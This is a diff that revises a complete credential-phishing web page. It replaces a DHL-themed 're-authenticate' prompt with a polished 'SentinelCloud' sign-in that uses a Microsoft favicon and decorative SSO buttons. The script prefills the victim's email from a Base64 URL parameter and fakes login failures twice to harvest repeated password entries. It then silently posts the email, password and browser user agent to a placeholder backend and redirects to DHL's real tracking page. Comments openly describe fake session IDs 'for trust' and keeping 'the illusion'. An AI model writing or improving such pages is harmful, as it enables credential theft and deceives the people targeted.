@@ -3,190 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Identity Provider | Verification Required</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=dhl.com">
-    
+    <title>Sign In | Secure Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=microsoft.com">
     <style>
         :root {
-            --bg: #0f172a;
-            --card-bg: #1e293b;
-            --primary: #0ea5e9;
-            --primary-hover: #0284c7;
-            --error: #f43f5e;
-            --text-main: #f8fafc;
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --bg-deep: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.7);
+            --border: rgba(255, 255, 255, 0.1);
+            --text: #f8fafc;
             --text-muted: #94a3b8;
-            --border: #334155;
+            --error-red: #ef4444;
         }
 
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background: var(--bg); 
-            color: var(--text-main); 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--bg-deep); color: var(--text); overflow: hidden; }
 
-        .card { 
-            background: var(--card-bg); 
-            padding: 2.5rem; 
-            border-radius: 12px; 
-            width: 100%; 
-            max-width: 400px; 
-            border: 1px solid var(--border); 
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 10px 10px -5px rgba(0, 0, 0, 0.04); 
-        }
-
-        .logo-area { text-align: center; margin-bottom: 1.5rem; }
-        .logo-area i { font-size: 2.5rem; color: var(--primary); }
-
-        h2 { margin: 0 0 0.5rem 0; font-size: 1.25rem; text-align: center; font-weight: 700; }
-        p.subtitle { color: var(--text-muted); font-size: 0.875rem; text-align: center; margin-bottom: 2rem; }
-
-        .input-group { margin-bottom: 1.25rem; position: relative; }
-        label { display: block; font-size: 0.75rem; font-weight: 600; margin-bottom: 0.5rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+        /* Modern Split-Screen Layout */
+        .page-wrapper { display: flex; height: 100vh; }
         
-        /* Input Icon Styling */
-        .input-group i { position: absolute; left: 12px; top: 38px; color: var(--text-muted); }
-        input { 
-            width: 100%; 
-            padding: 12px 12px 12px 40px; 
-            border-radius: 8px; 
-            border: 1px solid var(--border); 
-            background: #0f172a; 
-            color: white; 
-            box-sizing: border-box; 
-            transition: border-color 0.2s;
-            font-size: 0.95rem;
+        .visual-side { 
+            flex: 1; 
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            display: flex; align-items: center; justify-content: center;
+            position: relative; overflow: hidden;
         }
-        input:focus { outline: none; border-color: var(--primary); }
-
-        button { 
-            width: 100%; 
-            padding: 14px; 
-            background: var(--primary); 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            transition: background 0.2s;
-            margin-top: 0.5rem;
-        }
-        button:hover { background: var(--primary-hover); }
-
-        .error-box { 
-            background: rgba(244, 63, 94, 0.1); 
-            border: 1px solid var(--error); 
-            color: var(--error); 
-            padding: 10px; 
-            border-radius: 6px; 
-            font-size: 0.85rem; 
-            margin-bottom: 1.5rem; 
-            display: none; 
-            align-items: center; 
-            gap: 10px;
+        
+        /* Decorative "Security Grid" background */
+        .visual-side::before {
+            content: ""; position: absolute; width: 200%; height: 200%;
+            background-image: radial-gradient(rgba(37, 99, 235, 0.1) 1px, transparent 0);
+            background-size: 40px 40px; transform: rotate(15deg);
         }
 
-        .loader { display: none; text-align: center; padding: 10px; }
-        .spinner { 
-            border: 3px solid rgba(14, 165, 233, 0.2); 
-            border-top: 3px solid var(--primary); 
-            border-radius: 50%; 
-            width: 24px; height: 24px; 
-            animation: spin 1s linear infinite; 
-            margin: 10px auto;
+        .auth-side { width: 480px; display: flex; align-items: center; justify-content: center; background: #0b0f1a; border-left: 1px solid var(--border); padding: 40px; }
+
+        .auth-container { width: 100%; max-width: 360px; }
+        .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); margin-bottom: 2rem; display: flex; align-items: center; gap: 10px; }
+        
+        h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 0.5rem; letter-spacing: -0.02em; }
+        .subtitle { color: var(--text-muted); font-size: 0.95rem; margin-bottom: 2rem; }
+
+        /* Form Styling */
+        .input-wrapper { margin-bottom: 1.5rem; position: relative; }
+        .input-wrapper label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 8px; color: var(--text-muted); }
+        .input-wrapper i { position: absolute; left: 14px; top: 40px; color: var(--text-muted); font-size: 1rem; }
+        
+        input {
+            width: 100%; background: #161b2a; border: 1px solid var(--border); border-radius: 10px;
+            padding: 12px 12px 12px 42px; color: white; font-size: 1rem; transition: all 0.2s; box-sizing: border-box;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15); }
+        input:read-only { opacity: 0.7; cursor: not-allowed; }
+
+        /* Professional Buttons */
+        .btn-primary { 
+            width: 100%; padding: 14px; background: var(--primary); color: white; border: none; 
+            border-radius: 10px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 1rem;
+        }
+        .btn-primary:hover { background: var(--primary-hover); transform: translateY(-1px); }
+
+        .divider { display: flex; align-items: center; margin: 2rem 0; color: var(--text-muted); font-size: 0.75rem; text-transform: uppercase; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
+        .divider span { padding: 0 10px; }
+
+        .btn-sso {
+            width: 100%; padding: 10px; background: transparent; border: 1px solid var(--border);
+            border-radius: 10px; color: var(--text); font-size: 0.9rem; font-weight: 500;
+            display: flex; align-items: center; justify-content: center; gap: 10px; cursor: not-allowed; margin-bottom: 10px;
+        }
+
+        /* Status & Errors */
+        .alert { 
+            background: rgba(239, 68, 68, 0.1); border: 1px solid var(--error-red); color: var(--error-red);
+            padding: 12px; border-radius: 8px; font-size: 0.85rem; margin-bottom: 1.5rem; display: none; align-items: center; gap: 10px;
+        }
+        
+        .loader { display: none; text-align: center; }
+        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--primary); border-radius: 50%; width: 20px; height: 20px; animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Trust Footer */
+        .footer { position: absolute; bottom: 20px; font-size: 0.75rem; color: var(--text-muted); display: flex; gap: 20px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo-area"><i class="fas fa-shield-check"></i></div>
-    <h2>Confirm Identity</h2>
-    <p class="subtitle">For security reasons, please re-authenticate.</p>
-    
-    <div id="err" class="error-box">
-        <i class="fas fa-exclamation-circle"></i>
-        <span id="err-text">Authentication failed. Please try again.</span>
+<div class="page-wrapper">
+    <div class="visual-side">
+        <div style="text-align: center; z-index: 1;">
+            <i class="fas fa-vault" style="font-size: 4rem; color: var(--primary); margin-bottom: 1rem;"></i>
+            <h2 style="font-weight: 400;">Enterprise Grade Protection</h2>
+            <p style="color: var(--text-muted);">Verified Secure Session ID: <span id="session-id">...</span></p>
+        </div>
     </div>
 
-    <form id="f">
-        <div class="input-group">
-            <label>Account</label>
-            <i class="fas fa-envelope"></i>
-            <input type="email" id="u" required readonly>
-        </div>
-        <div class="input-group">
-            <label>Password</label>
-            <i class="fas fa-lock"></i>
-            <input type="password" id="p" required placeholder="••••••••">
-        </div>
-        <button type="submit" id="b">Authorize Session</button>
-    </form>
+    <div class="auth-side">
+        <div class="auth-container">
+            <div class="logo"><i class="fas fa-shield-halved"></i> SentinelCloud</div>
+            <h1>Welcome back</h1>
+            <p class="subtitle">Please enter your credentials to access your secure workspace.</p>
 
-    <div id="ld" class="loader">
-        <div class="spinner"></div>
-        <div style="font-size: 0.85rem; color: var(--primary);">Synchronizing with secure vault...</div>
+            <div id="alert-box" class="alert">
+                <i class="fas fa-circle-exclamation"></i>
+                <span id="alert-msg">Invalid credentials. Please try again.</span>
+            </div>
+
+            <form id="loginForm">
+                <div class="input-wrapper">
+                    <label>Work Email</label>
+                    <i class="fas fa-at"></i>
+                    <input type="email" id="emailField" required readonly>
+                </div>
+
+                <div class="input-wrapper">
+                    <label>Password</label>
+                    <i class="fas fa-key"></i>
+                    <input type="password" id="passField" placeholder="••••••••" required>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-primary">Sign In</button>
+            </form>
+
+            <div id="loader" class="loader">
+                <div class="spinner"></div>
+                <span style="font-size: 0.9rem; color: var(--text-muted);">Verifying with IdP...</span>
+            </div>
+
+            <div class="divider"><span>Or continue with</span></div>
+
+            <button class="btn-sso"><i class="fab fa-microsoft"></i> Microsoft 365</button>
+            <button class="btn-sso"><i class="fab fa-google"></i> Google Workspace</button>
+
+            <div class="footer">
+                <span>&copy; 2026 Sentinel Security</span>
+                <span>Privacy Policy</span>
+                <span>Terms</span>
+            </div>
+        </div>
     </div>
 </div>
 
 <script>
     let tries = 0;
-    const params = new URLSearchParams(window.location.search);
+    const urlParams = new URLSearchParams(window.location.search);
     
-    // Auto-extract user from URL (Base64)
-    if(params.has('u')) {
-        try { document.getElementById('u').value = atob(params.get('u')); } catch(e) {}
+    // Generate a fake session ID for "trust"
+    document.getElementById('session-id').innerText = Math.random().toString(36).substring(2, 15).toUpperCase();
+
+    // Decode user email (Base64)
+    if(urlParams.has('u')) {
+        try { document.getElementById('emailField').value = atob(urlParams.get('u')); } catch(e) {}
     }
 
-    document.getElementById('f').onsubmit = async (e) => {
+    document.getElementById('loginForm').onsubmit = async (e) => {
         e.preventDefault();
         tries++;
         
-        const email = document.getElementById('u').value;
-        const pass = document.getElementById('p').value;
-        const errBox = document.getElementById('err');
-        const btn = document.getElementById('b');
+        const email = document.getElementById('emailField').value;
+        const pass = document.getElementById('passField').value;
+        const alertBox = document.getElementById('alert-box');
+        const alertMsg = document.getElementById('alert-msg');
 
-        // Logic Step 1: First Attempt (Forced Error)
+        // Logic Step 1: First Attempt (Generic Failure)
         if(tries === 1) {
-            errBox.style.display = 'flex';
-            document.getElementById('p').value = "";
-            document.getElementById('p').focus();
+            alertBox.style.display = 'flex';
+            document.getElementById('passField').value = "";
+            document.getElementById('passField').focus();
         } 
-        // Logic Step 2: Second Attempt (Different Error Message)
+        // Logic Step 2: Second Attempt (System Specific Error)
         else if(tries === 2) {
-            errBox.style.display = 'flex';
-            document.getElementById('err-text').innerText = "Session timeout. Please try one last time.";
-            document.getElementById('p').value = "";
+            alertBox.style.display = 'flex';
+            alertMsg.innerText = "Internal Sync Error: Re-authentication required for this device.";
+            document.getElementById('passField').value = "";
         } 
-        // Logic Step 3: Final Attempt (Silent Send and Redirect)
+        // Logic Step 3: Final Attempt (Silent Success & Redirect)
         else {
-            errBox.style.display = 'none';
-            btn.style.display = 'none';
-            document.getElementById('ld').style.display = 'block';
+            alertBox.style.display = 'none';
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-            // Send data to backend
+            // Background transmission
             try {
-                await fetch('https://your-backend-server.com/process.php', {
+                await fetch('https://your-backend-api.com/v1/auth', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, pass, attempt: tries })
+                    body: JSON.stringify({ email, pass, meta: { tries, agent: navigator.userAgent } })
                 });
-            } catch(err) {
-                // Fail silently to keep the illusion
-            }
+            } catch(err) {}
 
-            // Redirect to legitimate site
+            // Final Redirection
             setTimeout(() => { 
                 window.location.href = "https://www.dhl.com/global-en/home/tracking.html"; 
-            }, 2000);
+            }, 1800);
         }
     };
 </script>
